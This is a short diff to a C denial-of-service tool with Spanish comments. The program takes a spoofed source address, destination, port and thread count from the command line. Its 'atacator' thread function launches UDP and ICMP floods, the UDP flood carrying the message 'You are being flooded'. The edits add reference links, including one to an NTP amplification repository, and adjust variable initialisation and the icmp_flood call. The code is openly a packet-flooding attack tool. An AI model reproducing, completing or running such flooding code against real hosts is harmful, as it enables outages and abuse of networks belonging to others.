@@ -1,3 +1,12 @@
+/*
+	Referencias:
+	- https://github.com/MaxXor/raw-sockets-example/blob/master/rawsockets.c
+	- https://stackoverflow.com/questions/48338190/sending-custom-tcp-packet-using-sendto-in-c
+	- https://github.com/flexingonlamers/Amp/blob/master/ntp.c
+
+*/
+
+
 #include <stdio.h>
 #include <string.h>
 #include <sys/socket.h>
@@ -30,9 +39,9 @@ void* atacator(void* args);
 
 int main(int argc, char *argv[]){
 
-	char *ip_addr, *subnet_mask, *protocolo, *puerto, *destino;
+	char *ip_addr, *protocolo, *puerto, *destino;
     int j, num_threads;
-
+	char *subnet_mask = NULL;
 	// Recibimos los argumentos por linea de comandos
     for (j = 1; j < argc; j+=2) {
         if (strcmp(argv[j], "-src") == 0) {
@@ -169,7 +178,7 @@ void* atacator(void* argumentos)
 	} else if((strcmp(args->protocolo, "udp_flood") == 0)){
 		udp_flood(args->sockfd, args->source, args->destino, atoi(args->puerto), "You are being flooded");
 	} else if((strcmp(args->protocolo, "icmp_flood") == 0)){
-		icmp_flood(args->sockfd, args->source, args->destino, atoi(args->puerto));
+		icmp_flood(args->sockfd, args->source, args->destino);
 	}
   	pthread_exit(NULL);
 }
